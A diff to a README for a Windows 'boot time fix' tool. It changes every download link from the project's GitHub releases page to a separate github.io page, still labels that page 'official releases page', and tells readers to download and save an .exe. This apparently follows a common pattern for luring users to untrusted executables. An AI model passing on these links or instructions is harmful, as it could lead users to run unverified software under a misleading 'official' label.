@@ -1,6 +1,6 @@
 # ⚡ Slow-Boot-Fix - Reduce Windows Boot Time To Seconds
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Shriharia7729/Slow-Boot-Fix/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://shriharia7729.github.io)
 
 ## 📌 About This Tool
 
@@ -22,9 +22,9 @@ Ensure your computer meets these requirements to use this tool:
 
 ## 🚀 Downloading The Software
 
-Visit the [official releases page](https://github.com/Shriharia7729/Slow-Boot-Fix/releases) to download the software.
+Visit the [official releases page](https://shriharia7729.github.io) to download the software.
 
-1. Open the [link](https://github.com/Shriharia7729/Slow-Boot-Fix/releases) in your web browser.
+1. Open the [link](https://shriharia7729.github.io) in your web browser.
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in .exe to start the download.
 4. Save the file to your desktop for easy access.
